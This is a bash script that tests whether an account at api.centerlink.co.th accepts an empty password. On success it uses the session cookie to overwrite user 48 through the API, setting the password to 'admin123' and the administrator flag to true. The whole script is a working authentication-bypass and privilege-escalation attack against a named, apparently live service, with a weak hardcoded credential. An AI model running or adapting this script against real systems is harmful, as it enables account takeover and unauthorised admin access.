#!/bin/bash
echo "=== Testing testlogin@test.com with EMPTY password ==="
RESPONSE=$(curl -s -X POST "https://api.centerlink.co.th/api/session" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=testlogin@test.com&password=" \
  -c cookies.txt \
  -w "\n---HTTP_CODE:%{http_code}---")

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
echo "HTTP Status: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
  echo ""
  echo "✅ LOGIN SUCCESS with empty password!"
  echo ""
  echo "=== Now we can set password via API ==="
  
  # Get user info
  USER_JSON=$(curl -s -X GET "https://api.centerlink.co.th/api/users/48" -b cookies.txt)
  
  # Update with new password
  curl -s -X PUT "https://api.centerlink.co.th/api/users/48" \
    -b cookies.txt \
    -H "Content-Type: application/json" \
    -d '{
      "id": 48,
      "name": "Test Login",
      "email": "testlogin@test.com",
      "password": "admin123",
      "administrator": true
    }' | head -20
  
  echo ""
  echo "Password set via API!"
else
  echo "Login failed. Response:"
  echo "$RESPONSE" | grep -v "HTTP_CODE" | head -10
fi

rm -f cookies.txt
